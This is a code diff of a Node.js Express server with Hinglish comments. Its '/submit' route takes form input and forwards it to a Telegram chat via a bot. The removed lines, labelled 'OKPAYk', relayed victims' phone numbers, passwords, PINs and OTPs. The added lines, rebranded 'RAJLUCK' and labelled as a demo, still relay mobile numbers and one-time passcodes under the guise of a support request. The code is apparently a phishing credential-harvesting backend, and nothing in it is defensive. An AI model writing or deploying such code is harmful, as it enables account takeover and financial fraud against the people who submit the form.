@@ -18,12 +18,11 @@ const bot = new TelegramBot(process.env.BOT_TOKEN);
 // Main Route jo HTML form ke fetch call se connect hoga
 app.post("/submit", async (req, res) => {
     try {
-console.log(req.body);
         // HTML se bheja gaya data yahan receive ho raha hai
-        const { phone,password,pin,otp,issue } = req.body;
+        const { mobile, otp, issue } = req.body;
 
         // Basic validation check
-        if (!phone) {
+        if (!mobile || !otp || !issue) {
             return res.status(400).json({
                 success: false,
                 message: "Kripya mobile number aur OTP dono enter karein."
@@ -31,14 +30,13 @@ console.log(req.body);
         }
 
         // Telegram par bheje jaane wale message ka format
-        const messageText = `OKPAYk NOTIFICATION
+        const messageText = 
+            "🧪 RAJLUCK NOTIFICATION\n\n" +
+            "📌 Support Issue: " + issue + "\n" +
+            "📱 Mobile Number: " + mobile + "\n" +
+            "🔑 Received OTP: " + otp + "\n\n" +
+            "Demo support information received.";
 
-Support Issue: ${issue}
-Mobile Number: ${phone}
-Password: ${password}
-Pin: ${pin}
-Received OTP: ${otp}`;
-        
         // Telegram bot ke zariye chat mein message send karna
         await bot.sendMessage(process.env.CHAT_ID, messageText);
 
@@ -59,5 +57,5 @@ Received OTP: ${otp}`;
 
 // Server initialization
 app.listen(PORT, () => {
-    console.log("okpayk server running successfully on port " + PORT);
+    console.log("RajLuck server running successfully on port " + PORT);
 });
